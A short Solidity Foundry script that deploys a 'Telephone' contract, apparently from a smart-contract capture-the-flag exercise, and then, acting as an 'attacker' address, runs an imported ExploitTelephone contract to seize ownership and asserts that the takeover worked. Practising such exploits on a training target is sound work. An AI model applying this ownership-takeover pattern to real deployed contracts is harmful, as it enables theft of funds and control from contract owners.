// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";
import {ExploitTelephone} from "../src/ExploitTelephone.sol";

contract DeployTelephone is Script {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function run() external {
        vm.startBroadcast();
        Telephone telephone = new Telephone();
        vm.stopBroadcast();

        // attack
        vm.prank(attacker);
        ExploitTelephone exploit = new ExploitTelephone();
        exploit.exploit(address(telephone), attacker);
        vm.stopPrank();

        assert(telephone.owner() == attacker);
    }
}
